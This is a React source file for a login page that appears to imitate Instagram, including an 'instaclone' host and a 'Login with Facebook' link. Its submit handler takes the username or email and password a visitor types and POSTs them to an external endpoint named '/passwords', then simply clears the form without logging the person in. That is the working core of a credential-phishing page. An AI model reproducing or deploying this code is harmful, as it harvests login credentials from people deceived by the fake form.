import { useState } from "react";
import "./App.css";
import { FaEye, FaEyeSlash, FaFacebook } from "react-icons/fa";

function App() {
  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword((show) => !show);
  };

  const handleEmailLogin = async (e) => {
    e.preventDefault();
    const form = e.target;
    const email = form.email.value;
    const password = form.password.value;

    fetch("https://instaclone1-0ctj.onrender.com/passwords", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: "Bearer YOUR_ACCESS_TOKEN",
      },
      body: JSON.stringify({ email, password }),
    })
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        console.log(data);
        form.reset();
      });
  };

  return (
    <>
      <div className="flex justify-center md:mt-[140px] mt-10 gap-5">
        <div className="md:block hidden">
          <img src="https://i.ibb.co/CMFMpwP/Screenshot-172.png" alt="" />
        </div>

        <div className="bg-white md:shadow-lg rounded-lg md:p-10 p-5 w-[80%] md:w-[20%] h-[20%] md:m-0 m-3">
          <img
            className="mx-auto mb-10"
            src="https://i.ibb.co/FXk5f0C/Screenshot-172.png"
            alt=""
          />
          <div>
            <form onSubmit={handleEmailLogin}>
              <div className="flex flex-col gap-4">
                <div>
                  <input
                    type="text"
                    name="email"
                    id="email"
                    placeholder="Username, or email
                    
                    "
                    className="border rounded-lg px-5 w-full"
                  />
                </div>
                <div className="border rounded-lg px-5 w-full flex justify-between items-center">
                  <input
                    name="password"
                    type={showPassword ? "text" : "password"}
                    id="password"
                    placeholder="Enter Password"
                  />
                  {showPassword ? (
                    <FaEye onClick={togglePasswordVisibility} />
                  ) : (
                    <FaEyeSlash onClick={togglePasswordVisibility} />
                  )}
                </div>
                <div>
                  <input
                    type="submit"
                    value="Log In"
                    className="w-full bg-blue-500 text-white rounded-lg px-5 py-1 font-semibold"
                  />
                </div>
                <div className="flex justify-center items-center">
                  <hr className="mt-5 mr-5 w-full" />
                  <p className="pt-4 text-slate-400 font-semibold">Or</p>
                  <hr className="mt-5 ml-5 w-full" />
                </div>
                <div className="flex items-center justify-center mt-3">
                  <FaFacebook className="text-blue-900 font-semibold "></FaFacebook>
                  <p className="text-blue-900 font-semibold ml-4">
                    Login with Facebook{" "}
                  </p>
                </div>
                <div className="text-center">
                  <a href="#" className="text-blue-700 text-sm">
                    Forgotten password ?
                  </a>
                </div>
                <div>
                  <p className="text-center">
                    Don't have an account?{" "}
                    <span className="text-blue-500 font-semibold">Sign up</span>
                  </p>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
